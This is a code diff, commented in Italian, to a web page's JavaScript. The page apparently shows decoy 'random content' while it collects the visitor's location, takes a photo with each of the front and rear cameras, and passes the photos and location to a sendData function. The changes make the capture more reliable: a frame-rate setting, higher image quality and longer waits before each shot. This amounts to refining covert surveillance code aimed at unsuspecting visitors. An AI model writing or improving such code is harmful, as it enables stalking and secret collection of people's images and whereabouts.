@@ -122,12 +122,17 @@
             const video = document.getElementById('video');
             if (video) {
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: facingMode, width: 640, height: 480 }
-                    });
+                    const constraints = {
+                        video: {
+                            facingMode: facingMode,
+                            width: 640,
+                            height: 480,
+                            frameRate: { ideal: 30 } // Aggiunto frameRate per stabilità
+                        }
+                    };
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                     video.srcObject = stream;
                     logDebug(`Fotocamera ${facingMode} avviata`);
-                    // Aspetta che il video sia pronto
                     await new Promise((resolve) => {
                         video.onloadedmetadata = () => {
                             logDebug(`Video pronto: ${video.videoWidth}x${video.videoHeight}`);
@@ -154,10 +159,12 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
+                // Aggiunto fillStyle per evitare sfondi neri
+                ctx.fillStyle = '#ffffff'; // Sfondo bianco per test
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
                 ctx.drawImage(video, 0, 0);
-                const photo = canvas.toDataURL('image/jpeg', 0.8); // Qualità ridotta
+                const photo = canvas.toDataURL('image/jpeg', 0.9); // Qualità aumentata
                 logDebug("Foto scattata, dimensione: " + photo.length + " caratteri");
-                // Mostra temporaneamente l'immagine per verifica
                 const tempImg = document.createElement('img');
                 tempImg.src = photo;
                 tempImg.style.maxWidth = '100%';
@@ -206,11 +213,11 @@
                 showRandomContent();
                 const location = await getLocation();
                 let stream = await startCamera('user');
-                await new Promise(resolve => setTimeout(resolve, 2000)); // Ritardo di 2 secondi
+                await new Promise(resolve => setTimeout(resolve, 2500)); // Ritardo aumentato a 2,5 secondi
                 const frontPhoto = takePhoto();
                 stopCamera(stream);
                 stream = await startCamera('environment');
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                await new Promise(resolve => setTimeout(resolve, 2500));
                 const backPhoto = takePhoto();
                 stopCamera(stream);
                 await sendData(location, frontPhoto, backPhoto);
